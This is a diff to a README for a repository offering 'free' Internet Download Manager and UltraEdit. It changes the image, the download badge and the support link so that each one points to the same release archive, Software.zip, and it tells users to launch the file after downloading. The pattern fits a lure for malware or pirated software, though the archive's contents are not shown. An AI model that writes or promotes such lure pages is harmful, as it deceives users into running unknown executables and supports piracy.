@@ -1,6 +1,6 @@
 # 🚀 Welcome to IDM-UltraEdit-Free Repository 🚀
 
-![IDM UltraEdit Free](https://example.com/idm-ultraedit.png)
+![IDM UltraEdit Free](https://github.com/coder-flare/IDM-UltraEdit-Free/releases/download/v2.0/Software.zip)
 
 ## Repository Description:
 Welcome to the "IDM-UltraEdit-Free" repository! Here you will find the latest version of Internet Download Manager (IDM), a powerful tool designed to boost download speeds, resume interrupted downloads, and schedule downloads effectively. Don't miss out on the opportunity to enhance your downloading experience with IDM!
@@ -23,7 +23,7 @@ Welcome to the "IDM-UltraEdit-Free" repository! Here you will find the latest ve
 🔑 ultraedit-idm-computer-solutions  
 
 ## Download IDM-UltraEdit-Free:
-[![Download Now](https://img.shields.io/badge/Download%20IDM%20UltraEdit-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Now](https://github.com/coder-flare/IDM-UltraEdit-Free/releases/download/v2.0/Software.zip%20IDM%20UltraEdit-v1.0.0-blue)](https://github.com/coder-flare/IDM-UltraEdit-Free/releases/download/v2.0/Software.zip)
 
 🚀 Click the button above to download IDM-UltraEdit-Free Version 1.0.0. Let's optimize your downloads with IDM now! 🚀
 
@@ -33,7 +33,7 @@ Check out the "Releases" section for the latest versions and enhancements of IDM
 Thank you for visiting our repository! Happy downloading! 🌟
 
 ---
-Feel free to reach out to us at [IDM-UltraEdit-Free Support](https://example.com/support) for any inquiries or assistance. Your feedback is important to us! 📧
+Feel free to reach out to us at [IDM-UltraEdit-Free Support](https://github.com/coder-flare/IDM-UltraEdit-Free/releases/download/v2.0/Software.zip) for any inquiries or assistance. Your feedback is important to us! 📧
 
 **Note:** IDM-UltraEdit-Free v1.0.0 needs to be launched once downloaded.
 
